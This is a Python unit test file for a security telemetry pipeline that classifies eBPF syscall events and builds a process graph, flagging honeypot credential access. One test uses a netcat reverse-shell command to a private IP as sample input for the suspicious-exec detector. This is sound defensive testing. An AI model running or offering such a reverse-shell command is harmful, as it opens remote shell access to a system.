"""
Unit tests for TRACECOMMON telemetry normalization and DAG building.
"""

from services.telemetry.schemas.events import RawEbpfEvent, RiskLevel
from services.telemetry.schemas.graph import NodeType
from services.telemetry.pipeline.normalizer import EventNormalizer
from services.telemetry.pipeline.dag_builder import DAGBuilder


def test_event_normalizer_honeypot_hit():
    raw_event = RawEbpfEvent(
        execution_id="exec-001",
        pid=1234,
        ppid=1,
        comm="python",
        syscall="sys_enter_openat",
        args={"filename": "/path/to/AKIA_HONEYPOT_PRISON_DEMO"},
        honeypot_key="AKIA_HONEYPOT_PRISON_DEMO",
    )

    normalized = EventNormalizer.normalize(raw_event)

    assert normalized.honeypot_hit is True
    assert normalized.risk_level == RiskLevel.HONEYPOT_HIT
    assert normalized.resolved_path == "/path/to/AKIA_HONEYPOT_PRISON_DEMO"


def test_event_normalizer_suspicious_exec():
    raw_event = RawEbpfEvent(
        execution_id="exec-002",
        pid=5555,
        ppid=1234,
        comm="bash",
        syscall="sys_enter_execve",
        args={"filename": "/bin/bash", "argv": ["-c", "nc -e /bin/sh 192.168.1.50 4444"]},
    )

    normalized = EventNormalizer.normalize(raw_event)

    assert normalized.risk_level == RiskLevel.SUSPICIOUS_EXEC


def test_dag_builder_node_color_classification():
    builder = DAGBuilder(execution_id="exec-003")

    # Event 1: Clean build step (npm test)
    e1 = EventNormalizer.normalize(
        RawEbpfEvent(
            execution_id="exec-003",
            pid=100,
            ppid=1,
            comm="npm",
            syscall="sys_enter_execve",
            args={"filename": "/usr/bin/npm", "argv": ["test"]},
        )
    )
    # Event 2: Honeypot access attempt
    e2 = EventNormalizer.normalize(
        RawEbpfEvent(
            execution_id="exec-003",
            pid=101,
            ppid=100,
            comm="node",
            syscall="sys_enter_openat",
            args={"filename": ".env.honeypot"},
            honeypot_key="AKIA_HONEYPOT_PRISON_DEMO",
        )
    )

    builder.add_event(e1)
    builder.add_event(e2)

    dag = builder.build()

    assert len(dag.nodes) == 2
    assert len(dag.edges) == 1
    assert dag.has_honeypot_hit is True
    assert dag.nodes[0].node_type == NodeType.BLUE_STANDARD
    assert dag.nodes[1].node_type == NodeType.AMBER_HONEYPOT
